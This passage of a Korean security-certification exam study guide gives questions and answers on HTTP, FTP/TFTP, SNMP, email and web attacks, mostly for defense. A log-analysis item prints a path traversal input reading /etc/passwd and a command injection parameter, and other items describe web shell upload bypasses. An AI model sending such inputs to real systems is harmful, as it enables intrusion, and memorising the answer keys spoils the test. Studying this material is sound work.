<summary>(서술형) HTTP 쿠키 속성 중 <code>expires</code> 속성을 설정하여 쿠키의 유효 기간을 최소화하는 것이 보안 강화에 기여하는 바를 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> 쿠키의 생존 기간을 명시적으로 제한함으로써, 브라우저 종료 후에도 클라이언트 PC의 물리적 디스크 등에 불필요하게 쿠키 정보가 방치되는 것을 방지한다. 이를 통해 차후 시스템이 물리적으로 탈취되거나 악성코드에 감염되었을 때 노출될 수 있는 자격 증명 정보를 보호할 수 있다.
</blockquote>
</details>

<details>
<summary>(서술형) 상태 코드 <strong>401 Unauthorized</strong>와 <strong>403 Forbidden</strong>을 서버가 반환하는 상황의 차이점을 '인증'과 '권한'의 관점에서 서술하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>401</strong>: 클라이언트가 누구인지 식별할 수 있는 정당한 <strong>인증(Authentication)</strong> 정보가 없거나 잘못되었을 때 발생한다. (로그인 창이 뜨며 재인증 요구)<br>
- <strong>403</strong>: 클라이언트가 누구인지 인증은 되었으나, 요청한 해당 자원에 접근할 수 있는 적절한 <strong>권한(Authorization)</strong>이 부여되지 않아 서버가 접근을 거부한 상태이다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음 HTTP 요청 라인(Request Line)의 각 구성 요소(A, B, C)를 명칭과 함께 분석하시오.<br>
<code><strong>( A )</strong> <strong>( B )</strong> <strong>( C )</strong></code><br>
<code>POST /home/login.php HTTP/1.1</code></summary>
<blockquote>
<strong>정답:</strong><br>
(A) <strong>요청 메소드 (Method)</strong>: 서버에 수행할 동작(POST)을 지시함<br>
(B) <strong>요청 URI (Request-URI)</strong>: 대상 자원의 경로(/home/login.php)를 지정함<br>
(C) <strong>HTTP 버전 (HTTP-Version)</strong>: 사용 중인 프로토콜의 버전 정보(HTTP/1.1)를 나타냄
</blockquote>
</details>

<details>
<summary>(작업형) 웹 서버 보안 설정 시 일반적인 서비스에서 권장되지 않는 <strong>PUT</strong>과 <strong>DELETE</strong> 메소드를 차단해야 하는 이유를 각각 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>PUT</strong>: 공격자가 서버의 임의 경로에 악성 스크립트(웹쉘 등) 파일을 신규 생성하거나 기존 파일을 변조할 위험이 있다.<br>
- <strong>DELETE</strong>: 서버에 존재하는 중요 파일이나 서비스를 공격자가 임의로 삭제하여 가용성을 해칠 위험이 있다.
</blockquote>
</details>

### FTP(File Transfer Protocol) 보안

<details>
<summary>[442] (단답형) 다음 빈칸에 적절한 용어를 쓰시오.<br>
( A )은/는 인터넷상에서 컴퓨터 간에 파일(File)을 교환하기 위한 표준 프로토콜이다. ( A ) 동작 모드에는 ( B ) 모드와 ( C ) 모드가 있는데 일반적으로 ( C ) 모드를 사용한다. 유닉스/리눅스 시스템에서 ( A ) 사용자에 대한 접근 제한(차단 리스트)은 ( D ) 파일에서 설정 가능하다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>FTP</strong>, (B) <strong>능동(Active)</strong>, (C) <strong>수동(Passive)</strong>, (D) <strong>ftpusers</strong>
</blockquote>
</details>

<details>
<summary>[443] (단답형) FTP 동작 모드 중, 인증 요청과 데이터 송수신 요청을 모두 클라이언트 쪽에서 서버로 시도하는 방식을 ( ) 모드라고 한다.</summary>
<blockquote>
<strong>정답:</strong> <strong>수동(Passive)</strong> 모드
</blockquote>
</details>

<details>
<summary>[444] (서술형) FTP의 두 가지 동작 모드인 **Active(능동) 모드**와 **Passive(수동) 모드**의 데이터 채널 연결 방식의 차이점을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>Active 모드</strong>: 클라이언트가 서버의 21번 포트로 접속(제어 채널)한 후, 서버가 클라이언트가 알려준 포트로 **역접속**(데이터 채널)하여 데이터를 전송한다. 클라이언트 측 방화벽 설정에 따라 차단될 수 있다.<br>
- <strong>Passive 모드</strong>: 클라이언트가 서버의 21번 포트로 접속한 후, 서버가 알려주는 임의의 높은 포트(1024 이상)로 **클라이언트가 직접 접속**(데이터 채널)하여 데이터를 전송한다. 서버 측 방화벽에서 데이터 채널용 포트 범위를 허용해줘야 한다.
</blockquote>
</details>

<details>
<summary>[445] (작업형) FTP 동작 방식에 따른 포트 접속 방향과 관련하여 빈칸을 채우시오.<br>
1) Active 모드에서 데이터 채널을 위해 사용하는 서버측 포트: <strong>( A )</strong><br>
2) Passive 모드에서 데이터 채널을 위해 사용하는 서버쪽 대기 포트: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>20/tcp</strong>, (B) <strong>1024번 이상의 임의의 포트</strong>
</blockquote>
</details>

<details>
<summary>[446] (단답형) FTP 동작 모드에 대한 설명이다. 빈칸을 채우시오.<br>
능동 모드는 서버의 ( A ) 포트를 이용하여 접속하고 ( B ) 포트를 이용하여 데이터를 전송한다. 수동 모드는 서버의 ( A ) 포트를 이용하여 접속하고 1024/tcp 이상의 포트를 이용하여 데이터를 전송한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>21/tcp</strong>, (B) <strong>20/tcp</strong>
</blockquote>
</details>

<details>
<summary>[447] (단답형) 유닉스/리눅스 시스템에서 특정 계정(예: root)의 FTP 접속을 제한하기 위해 차단할 계정명을 등록해두는 설정 파일의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>/etc/ftpusers</code>
</blockquote>
</details>

<details>
<summary>[448] (서술형) **FTP 바운스 공격(FTP Bounce Attack)**의 원리와 이를 이용해 공격자가 얻으려는 목적을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>원리</strong>: FTP의 Active 모드가 <code>PORT</code> 명령어를 통해 데이터 채널을 임의의 IP/포트로 연결할 수 있다는 취약점을 이용한다. 공격자가 자신의 위치를 숨기고 FTP 서버를 경유하여 타겟 시스템의 포트 활성화 여부를 스캔하는 방식이다.<br>
- <strong>목적</strong>: 공격자의 IP를 은폐(익명성 확보)하고, 외부에서 직접 접근이 불가능한 내부망 시스템의 포트를 스캔하거나 공격하는 경로로 활용한다.
</blockquote>
</details>

<details>
<summary>[450] (단답형) 읽기 전용 메모리나 디스크가 없는 워크스테이션에 설치될 수 있을 정도로 매우 단순하고 간단한 파일 송수신 프로토콜이다. 69/udp 포트를 사용하며 별도의 인증 과정 없이 지정된 디렉터리에 접근할 수 있는 취약점이 있다. 이 프로토콜은?</summary>
<blockquote>
<strong>정답:</strong> <strong>TFTP (Trivial FTP)</strong>
</blockquote>
</details>

<details>
<summary>[451] (작업형) <code>inetd</code> 슈퍼데몬 설정 파일(<code>inetd.conf</code>)에 <code>in.tftpd</code> 서비스 설정을 하려고 한다. 보안상 지정한 디렉토리의 상위 디렉토리로 이동하지 못하도록 하는(secure mode) 빈칸에 적절한 옵션을 쓰시오.<br>
<code>tftp dgram udp wait root /usr/sbin/in.tftpd in.tftpd <strong>( A )</strong> /tftpboot</code></summary>
<blockquote>
<strong>정답:</strong> <code>-s</code>
</blockquote>
</details>

<details>
<summary>[452] (단답형) 파일 전송 서비스 운영 시 발생할 수 있는 공격들에 대한 설명이다. 빈칸을 채우시오.<br>
( A ): 주로 부팅 이미지를 클라이언트에게 전달할 목적으로 UDP 69번 포트를 사용하며 인증 과정이 없는 프로토콜에 대한 공격이다.<br>
( B ): 패스워드를 요구하지 않는 FTP 설정의 취약점을 이용한 공격이다.<br>
( C ): <code>PORT</code> 명령어를 사용하여 FTP 서버로 하여금 공격자가 원하는 곳으로 데이터를 전송하게 하는 공격이다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>TFTP 공격</strong>, (B) <strong>Anonymous FTP 공격</strong>, (C) <strong>FTP Bounce 공격</strong>
</blockquote>
</details>

<details>
<summary>(단답형) FTP의 평문 전송 취약점을 보완하기 위해 SSH 프로토콜 기반으로 암호화하여 파일을 전송하며 22/tcp 포트를 사용하는 프로토콜의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>SFTP</strong> (SSH File Transfer Protocol)
</blockquote>
</details>

<details>
<summary>(단답형) FTP 능동 모드(Active Mode)에서 클라이언트가 서버에게 "데이터 전송 시 내가 대기 중인 이 IP와 포트로 접속하라"고 알려주기 위해 제어 채널을 통해 보내는 명령어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>PORT</strong>
</blockquote>
</details>

<details>
<summary>(단답형) FTP 수동 모드(Passive Mode)에서 클라이언트가 서버에게 데이터 채널 수립을 위해 "서버 측에서 대기 중인 임의의 포트 정보를 알려달라"고 요청할 때 전송하는 명령어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>PASV</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 외부망에서 내부망으로 유입되는 트래픽을 ( A ) 트래픽, 내부에서 외부로 나가는 트래픽을 ( B ) 트래픽이라 한다. 수동 모드 FTP는 서버 측 방화벽 입장에서 ( A ) 포트 허용 정책이 광범위해지는 단점이 있다. 빈칸을 채우시오.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>인바운드 (Inbound)</strong>, (B) <strong>아웃바운드 (Outbound)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 방화벽에서 FTP 제어 채널(21번)만 허용하더라도 제어 채널 내의 PORT/PASV 명령을 분석하여 유동적인 데이터 채널을 동적으로 허용해주는 보안 기능의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>상태 검사 (Stateful Inspection)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) vsftpd 서버 설정 파일(vsftpd.conf)에서 ID와 비밀번호 인증 없이 접속 가능한 익명 계정의 접속을 비활성화하기 위한 설정 지시어와 값은?</summary>
<blockquote>
<strong>정답:</strong> <code>anonymous_enable=NO</code>
</blockquote>
</details>

<details>
<summary>(단답형) vsftpd 서버에서 <code>userlist_enable=YES</code> 설정 후, 특정 사용자의 접속을 차단하기 위해 계정 명을 등록하여 관리하는 설정 파일의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <code>user_list</code>
</blockquote>
</details>

<details>
<summary>(단답형) FTP 바운스 공격(Bounce Attack)에서 공격자가 FTP 서버를 경유하여 내부 네트워크를 스캔하기 위해 목적지 정보를 조작하여 전송하는 명령어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>PORT</strong> 명령
</blockquote>
</details>

<details>
<summary>(단답형) TFTP 서비스 운영 시 특정 디렉터리를 최상위(Root) 디렉터리로 고정하여 상위 경로로의 이동을 방지하는 보안 모드의 명칭과, 실행 시 사용하는 지시어(옵션)는?</summary>
<blockquote>
<strong>정답:</strong> <strong>Secure 모드 (또는 chroot 모드)</strong>, <strong>-s</strong> 옵션
</blockquote>
</details>

<details>
<summary>(서술형) FTP 능동 모드(Active Mode)에서 클라이언트 측에 윈도우 방화벽이 설치되어 있을 때, 제어 채널은 연결되나 데이터 채널이 형성되지 않는 기술적 이유를 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 능동 모드에서는 서버가 클라이언트의 임의 포트로 <strong>역접속(인바운드 연결)</strong>을 시도한다. 클라이언트 방화벽의 기본 정책이 외부로부터 유입되는 인바운드 접속을 차단하는 경우, 서버의 데이터 채널 연결 요청이 거부되어 파일 목록 조회나 전송이 불가능해진다.
</blockquote>
</details>

<details>
<summary>(서술형) TFTP(UDP 69)가 보안상 중대한 결함을 갖는 근본적인 원인 2가지를 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1. <strong>인증 부재</strong>: ID와 패스워드 검증 절차 없이 지정된 디렉터리의 모든 파일에 접근이 가능하다.<br>
2. <strong>비연결성 전송</strong>: UDP를 사용하므로 데이터 전송에 대한 신뢰성이 낮고 세션 관리가 되지 않아 스푸핑 공격 등에 취약하다.
</blockquote>
</details>

<details>
<summary>(서술형) vsftpd에서 <strong>ftpusers</strong> 파일과 <strong>user_list</strong> 파일의 공통적인 보안 설정 목적을 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> FTP는 아이디와 비밀번호가 평문으로 전송되는 취약한 프로토콜이므로, 노출 시 위험도가 큰 <strong>root 명의의 중요 계정</strong>들이 FTP를 통해 직접 로그인하지 못하도록 접속 가능한 계정 목록을 엄격히 제한(차단)하는 것을 목적으로 한다.
</blockquote>
</details>

<details>
<summary>(작업형/계산) 다음 PORT 명령어 패킷 조사 결과 확인된 인자를 분석하여, 서버가 접속을 시도할 클라이언트의 **포트 번호**를 계산하시오.<br>
<code>PORT 192,168,10,132,15,200</code></summary>
<blockquote>
<strong>정답:</strong> <strong>4040</strong> 번<br>
<strong>계산식:</strong> 앞의 4개 옥텟은 IP 주소이고, 뒤의 2개 숫자가 포트 번호를 결정한다. (15 * 256) + 200 = 3840 + 200 = 4040이다.
</blockquote>
</details>

<details>
<summary>(작업형) vsftpd.conf 설정 파일에서 <strong>TCP Wrapper(hosts.allow/deny)</strong>와 연동하여 IP 기반 접근 제어를 활성화하기 위해 필요한 설정 지시어를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>tcp_wrappers=YES</code>
</blockquote>
</details>

<details>
<summary>(작업형) inetd 슈퍼데몬 환경에서 TFTP 서비스를 <code>/tftpboot</code> 디렉터리로 제한하여 보안 모드로 실행하도록 <code>inetd.conf</code> 파일에 설정하는 지문을 작성하시오.</summary>
<blockquote>
<strong>정답:</strong> <code>tftp dgram udp wait root /usr/sbin/in.tftpd in.tftpd -s /tftpboot</code>
</blockquote>
</details>

### SNMP(Simple Network Management Protocol) 보안

<details>
<summary>[기출 21회 2번 문제] (단답형) 라우터에서 SNMP 프로토콜을 비활성화하기 위해 ( )에 들어갈 명령어를 기술하시오.<br>
<code>Router(config)# (A) (B)</code></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>no</strong>, (B) <strong>snmp-server</strong> (전체 명령: <code>no snmp-server</code>)
</blockquote>
</details>

<details>
<summary>[453] (단답형) SNMP는 OSI 7계층의 ( A ) 계층 프로토콜이며, 전송 계층 프로토콜로 ( B )을/를 사용한다. 일반적인 SNMP 질의는 161번 포트, SNMP TRAP 메시지는 ( C )번 포트로 전송된다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>응용 (Application)</strong>, (B) <strong>UDP</strong>, (C) <strong>162</strong>
</blockquote>
</details>

<details>
<summary>[454] (단답형) TCP/IP 네트워크 장치로부터 여러 관리 정보를 자동으로 수집하고 실시간으로 상태를 모니터링 및 설정할 수 있는 인터넷 표준 프로토콜은?</summary>
<blockquote>
<strong>정답:</strong> <strong>SNMP (Simple Network Management Protocol)</strong>
</blockquote>
</details>

<details>
<summary>[455] (단답형) 네트워크 관리를 위해 시스템이나 네트워크 장비에 설정하는 프로토콜로, 원격 실시간 상태 모니터링 등의 기능을 수행하지만 시그니처가 평문 전송되는 등의 보안 취약점이 존재하는 프로토콜은?</summary>
<blockquote>
<strong>정답:</strong> <strong>SNMP</strong>
</blockquote>
</details>

<details>
<summary>[456] (단답형) SNMP 취약점에 대한 설명이다. 빈칸을 채우시오.<br>
SNMP에서 매니저와 에이전트가 데이터를 교환하기 전에 인증하는 일종의 패스워드로 초기값은 ( A ) 또는 private 등으로 설정되어 있다. 또한 SNMP는 읽기만 가능한 RO와 읽기/쓰기가 가능한 ( B ) 모드를 제공한다. 최신 버전인 ( C )에서는 인증 및 암호화가 제공된다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>community string</strong> (또는 public), (B) <strong>RW (Read/Write)</strong>, (C) <strong>SNMP Version 3</strong>
</blockquote>
</details>

<details>
<summary>[457] (단답형) 네트워크 장비 관리 및 모니터링을 위한 프로토콜인 SNMP가 사용하는 전송 계층 프로토콜과 기본 포트 번호를 각각 쓰시오.<br>
1) SNMP(Get/Set 요청): <strong>( A )</strong> / <strong>( B )</strong><br>
2) SNMP Trap(통보): <strong>( A )</strong> / <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>UDP</strong>, (B) <strong>161번</strong>, (C) <strong>162번</strong>
</blockquote>
</details>

<details>
<summary>[458] (단답형) SNMP는 <code>get-request</code>, <code>get-response</code>, <code>trap</code> 등의 메시지로 구성되어 있다. 다음 빈칸을 채우시오.<br>
1) Trap 메시지는 <strong>( A )</strong>번 포트를 사용하고, 그 외의 메시지들은 <strong>( B )</strong>번 포트를 사용한다.<br>
2) 관리되어야 할 정보나 객체들을 모아놓은 집합체를 <strong>( C )</strong>라고 한다.<br>
3) MIB를 정의하기 위한 일반적인 구조와 문법을 정의하는 언어를 <strong>( D )</strong>라고 하며, 메시지 전송 시 비트 변환을 담당하는 규칙을 <strong>( E )</strong>라고 한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>162/udp</strong>, (B) <strong>161/udp</strong>, (C) <strong>MIB</strong>, (D) <strong>SMI</strong> (또는 ASN.1), (E) <strong>BER</strong>
</blockquote>
</details>

<details>
<summary>[459] (단답형) SNMP의 데이터 수집 방식에 대한 설명이다. 빈칸을 채우시오.<br>
매니저가 에이전트에게 정보를 요청하면 에이전트가 응답하는 방식을 <strong>( A )</strong> 방식이라 하고, 이때 UDP 161번 포트를 사용한다. 반사회 에이전트가 이벤트 발생 시 이를 매니저에게 알리는 방식을 <strong>( B )</strong> 방식이라 하고, 이때 매니저의 UDP 162번 포트를 사용한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>폴링(Polling)</strong>, (B) <strong>이벤트 리포팅(Event Reporting)</strong> (또는 Trap)
</blockquote>
</details>

<details>
<summary>[460] (단답형) 네트워크 장비는 NMS를 통해 관리된다. NMS 서버는 <strong>( A )</strong> 방식으로 장비 상태를 수집하고, 장비의 특정 이벤트 발생 시 <strong>( B )</strong> 방식으로 실시간 보고를 받는다. 또한 장비에서 발생하는 실시간 로그 정보를 <strong>( C )</strong> 방식으로 전송하기도 한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>Polling</strong>, (B) <strong>Event Reporting</strong>, (C) <strong>syslog</strong>
</blockquote>
</details>

<details>
<summary>[461] (단답형) 다음 설명에 해당하는 용어를 각각 쓰시오.<br>
1) 다양한 장비의 로그 메시지를 원격 로그 수집기로 보내 분석하기 위한 UDP 기반의 인터넷 표준 프로토콜: <strong>( A )</strong><br>
2) 네트워크 장비로부터 정보를 수집 및 관리하며 장치의 동작을 변경하는 데 사용되는 인터넷 표준 프로토콜: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>syslog</strong>, (B) <strong>SNMP</strong>
</blockquote>
</details>

<details>
<summary>[462] (단답형) 다음 이메일 관련 위협에 대한 설명이다. 빈칸을 채우시오.<br>
( A ): 특정인이나 시스템을 대상으로 엄청난 양의 전자우편을 일시에 보내 시스템에 고갈을 일으키는 기술이다.<br>
( B ): 발신자와 수신자가 관계없이 일방적으로 대량 전송되는 전자우편으로 정크메일이라고도 불린다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>폭탄메일 (Mail Bomb)</strong>, (B) <strong>스팸메일 (Spam Mail)</strong>
</blockquote>
</details>

### 이메일 보안(Email Security)

<details>
<summary>(기출 25회 6번 문제) (단답형/작업형) 외부망에서 내부 메일 서버를 경유하여 다시 외부망으로 메일을 전송하는 '메일 릴레이(Relay)' 기능을 설정하고자 할 때 사용하는 옵션의 명칭과 그 의미를 쓰시오.
<div style="border: 1px solid #777; padding: 10px; margin-top: 10px; border-radius: 5px;">
1. 허용할 때 사용하는 지시어: <code>( A )</code><br>
2. 차단할 때 사용하는 지시어: <code>( B )</code> (또는 REJECT, ERROR)
</div>
</summary>
<blockquote>
(A) <strong>RELAY</strong><br>
(B) <strong>DISCARD</strong> (또는 REJECT, ERROR)
</blockquote>
</details>

<details>
<summary>[463] (단답형) 이메일 시스템을 구성하는 다음 요소들의 명칭을 쓰시오.<br>
1) 사용자가 메일을 작성하거나 수신된 메일을 읽는 프로그램(예: 아웃룩): <strong>( A )</strong><br>
2) 메일 서버 간에 메일을 전송하거나 클라이언트로부터 메일을 수신하는 서버: <strong>( B )</strong><br>
3) 수신된 메일을 사용자의 편지함(Mailbox)에 저장해주는 모듈: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>MUA</strong> (Mail User Agent), (B) <strong>MTA</strong> (Mail Transfer Agent), (C) <strong>MDA</strong> (Mail Delivery Agent)
</blockquote>
</details>

<details>
<summary>[464] (단답형) 다음 인터넷 메일의 처리 과정을 설명한 것이다. 빈칸을 채우시오.<br>
1) 사용자가 메일을 전송할 때 사용하는 프로토콜: <strong>( A )</strong><br>
2) 메일 서버(MTA) 간에 메일을 전달할 때 사용하는 프로토콜: <strong>( B )</strong><br>
3) 사용자가 메일 박스에서 메일을 읽어올 때 사용하는 프로토콜: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>SMTP</strong>, (B) <strong>SMTP</strong>, (C) <strong>POP3 또는 IMAP</strong>
</blockquote>
</details>

<details>
<summary>[465] (단답형/서술형) 다음 이메일 관련 프로토콜(SMTP, POP3, IMAP)에 대한 설명이다. 빈칸을 채우시오.<br>
( A ): 이메일을 발송할 때 사용하며 25/tcp 포트를 사용한다.<br>
( B ): 서버로부터 메일을 다운로드하며 조회 후 서버에서 삭제하는 방식이고 110/tcp 포트를 사용한다.<br>
( C ): 서버의 메시지를 읽어오며 서버에 유지하여 동기화하는 방식이고 143/tcp 포트를 사용한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>SMTP</strong>, (B) <strong>POP3</strong>, (C) <strong>IMAP</strong>
</blockquote>
</details>

<details>
<summary>[466] (단답형) 보안 이메일 프로토콜의 표준 포트 번호를 각각 쓰시오.<br>
1) SMTPS: <strong>( A )</strong><br>
2) POP3S: <strong>( B )</strong><br>
3) IMAPS: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>465번</strong>, (B) <strong>995번</strong>, (C) <strong>993번</strong>
</blockquote>
</details>

<details>
<summary>[467] (단답형) 메일 서버 외부에서 메일 서버를 경유하여 다른 메일 서버로 메일을 발송하는 기능을 무엇이라 하는가? 인증 없이 모든 곳에 허용될 경우 스팸 발송지로 악용될 수 있다.</summary>
<blockquote>
<strong>정답:</strong> <strong>메일 릴레이(RELAY)</strong> 기능
</blockquote>
</details>

<details>
<summary>[468] (작업형) Sendmail의 <code>access</code> 파일 설정에서 다음 빈칸에 들어갈 처리 방식을 쓰시오.<br>
1) 지정된 대상의 메일 릴레이를 허용한다: <strong>( A )</strong><br>
2) 메일 수신을 거부하고 거부 메시지를 발신자에게 보낸다: <strong>( B )</strong><br>
3) 메일을 폐기하고 발신자에게는 성공적으로 보낸 것처럼 속인다: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>RELAY</strong>, (B) <strong>REJECT</strong>, (C) <strong>DISCARD</strong>
</blockquote>
</details>

<details>
<summary>[469] (작업형) Sendmail에서 스팸 릴레이 차단 정책(access)을 설정한 후 이를 DB 파일(access.db)로 변환하는 명령어를 쓰시오.<br>
<code><strong>( A )</strong> <strong>( B )</strong> /etc/mail/access.db < /etc/mail/access</code></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>makemap</strong>, (B) <strong>hash</strong>
</blockquote>
</details>

<details>
<summary>[470] (단답형) Sendmail(8.9 이상)에서 릴레이 제한 및 스팸 차단 정책을 관리하는 텍스트 파일의 경로와 이름을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>/etc/mail/access</code>
</blockquote>
</details>

<details>
<summary>[471] (단답형/서술형) 필 지머먼이 개발한 이메일 보안 프로토콜인 **PGP**가 제공하는 주요 보안 기능 4가지를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>기밀성</strong>(대칭키 암호화), <strong>인증 및 무결성</strong>(디지털 서명), <strong>압축</strong>(ZIP), <strong>단편화 및 조립</strong> (또는 이메일 호환성 Radix-64)
</blockquote>
</details>

<details>
<summary>[472] (단답형) PGP에서 8비트 데이터를 7비트 ASCII 문자열로 변환하여 메일 시스템 간의 호환성을 유지해주는 인코딩 방식의 명칭은 무엇인가?</summary>
<blockquote>
<strong>정답:</strong> <strong>Radix-64</strong> (Base64 계열)
</blockquote>
</details>

<details>
<summary>[473] (단답형) 이메일 발송 경로(IP)를 분석하고 실제 발송 서버를 역추적하기 위해 확인해야 하는 헤더는 무엇인가?</summary>
<blockquote>
<strong>정답:</strong> <strong>Received</strong> 헤더
</blockquote>
</details>

<details>
<summary>[474] (서술형) 다음 이메일 보안 도구들의 특징을 간단히 쓰시오.<br>
1) <strong>SpamAssassin</strong>: <strong>( A )</strong><br>
2) <strong>Procmail</strong>: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong><br>
- (A) <strong>SpamAssassin</strong>: 규칙 기반 및 블랙리스트 등을 분석하여 스팸 점수를 매겨 필터링한다.<br>
- (B) <strong>Procmail</strong>: 사용자별 필터링 규칙(forward 등)을 통해 메일을 자동 분류하거나 처리한다.
</blockquote>
</details>

### 웹 보안 및 OWASP Top 10

<details>
<summary>[기출 21회 6번 문제] (단답형) 불완전한 암호화 저장 취약점 점검 방법에 관하여 ( )에 들어갈 용어를 설명하시오.<br>
1. DB에 저장된 중요정보가 (A)로 열람 가능한지 확인한다.<br>
2. (B) 또는 암호화된 쿠키값이 명백하게 랜덤으로 생성되는지 확인한다.<br>
3. 적절한 (C)이 제대로 적용되었는지 검증한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>평문 (Plaintext) 또는 SQL Query</strong>, (B) <strong>세션 ID (Session ID)</strong>, (C) <strong>암호화 알고리즘</strong>
</blockquote>
</details>

<details>
<summary>(기출 23회 13번 문제) (서술형) PHP 게시판 소스코드에서 파일 업로드 시 확장자를 화이트리스트 방식으로 검증하지만, Content-Type 헤더를 image/jpeg로 조작하거나 대소문자 혼용(test.pHp) 등을 통해 필터링을 우회하여 <strong>웹쉘(WebShell)</strong>을 업로드하는 공격이 가능하다. 이때 공격이 성공하기 위한 서버 측 설정 조건(httpd.conf 등)을 3가지 서술하시오.</summary>
<blockquote>
1. <code>AllowOverride None</code> 설정이 되어 있지 않아 <code>.htaccess</code> 파일로 설정을 덮어쓸 수 있는 경우<br>
2. <code>FilesMatch</code> 지시어에서 특정 확장자에 대한 실행 제한이 미비한 경우<br>
3. <code>AddType</code> 또는 <code>AddHandler</code> 지시어를 통해 변조된 확장자가 스크립트 엔진에 의해 실행되도록 설정된 경우
</blockquote>
</details>

<details>
<summary>[484] (단답형) 공격자가 웹 서버의 파일 업로드 취약점을 이용하여 <strong>WebShell</strong>과 같은 악성 스크립트 파일(asp, jsp, php 등)을 업로드한 뒤, 이를 실행하여 서버의 제어권을 탈취하는 공격의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>파일 업로드(File Upload)</strong> 취약점 공격
</blockquote>
</details>

<details>
<summary>[504] (작업형) **XSS(Cross Site Scripting)**의 두 가지 주요 유형에 대해 빈칸을 채우시오.<br>
1) 악성 스크립트가 포함된 게시물을 서버의 DB 등에 영구적으로 저장하여, 사용자가 해당 게시물을 읽을 때마다 스크립트가 실행되는 방식: <strong>( A )</strong><br>
2) 악성 스크립트가 포함된 링크를 사용자가 클릭하게 유도하여, 서버가 해당 스크립트를 포함한 응답을 사용자에게 즉시 반사(Reflect)하며 실행되는 방식: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>Stored(저장형) XSS</strong>, (B) <strong>Reflected(반사형) XSS</strong>
</blockquote>
</details>

<details>
<summary>[476] (서술형) **CSRF(Cross-Site Request Forgery)** 공격을 방어하기 위한 주요 기술적 대책 3가지를 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1) <strong>CSRF 토큰 사용</strong>: 모든 요청에 대해 매번 변경되는 난수 형태의 토큰을 발행하고, 서버에서 이를 검증한 후 요청을 처리한다.<br>
2) <strong>HTTP Method 제한</strong>: 데이터 변경이 발생하는 요청은 GET 방식이 아닌 <strong>POST</strong> 방식을 사용하도록 제한한다.<br>
3) <strong>재인증 요구</strong>: 송금, 비빌번호 변경 등 중요한 기능 실행 시 비밀번호 재입력이나 2차 인증(OTP 등)을 요구한다.
</blockquote>
</details>

<details>
<summary>[492] (분석/단답형) 다음 공격 로그를 분석하여 각각 어떤 공격 유형에 해당하는지 쓰시오.<br>
1) <code>?file=passwd&path=../../../../etc/passwd</code>: <strong>( A )</strong><br>
2) <code>?name=admin&cmd=ls -al</code>: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>Path Traversal</strong> (또는 Directory Traversal / 파일 다운로드), (B) <strong>OS Command Injection</strong> (운영체제 명령어 삽입)
</blockquote>
</details>

<details>
<summary>[484] (단답형) 공격자가 웹 서버에 업로드하여 원격으로 시스템 명령어를 실행하거나 파일을 관리할 수 있게 해주는 악성 스크립트(asp, jsp, php 등)를 무엇이라 하는지 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>웹쉘(WebShell)</strong>
</blockquote>
</details>

<details>
<summary>[492] (작업형) PHP 기반 웹 애플리케이션에서 **RFI(Remote File Inclusion)** 공격을 방지하기 위한 설정 파일과 항목값을 쓰시오.<br>
1) 설정 파일: <strong>( A )</strong><br>
2) 설정 항목: <code>allow_url_fopen</code> = <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <code>php.ini</code>, (B) <code>Off</code>
</blockquote>
</details>

<details>
<summary>[508] (분석/단답형) 공격자가 HTTP 요청 메시지에 줄바꿈 문자를 삽입하여 서버의 응답 헤더를 조작하거나 2개의 응답을 만들어 내어 XSS 등을 유도하는 공격의 명칭과, 이때 사용되는 줄바꿈 제어문자의 명칭(또는 URL 인코딩 값)을 쓰시오.<br>
1) 공격명: <strong>( A )</strong><br>
2) 제어문자 1: <strong>( B )</strong><br>
3) 제어문자 2: <strong>( C )</strong></summary>
<blockquote>
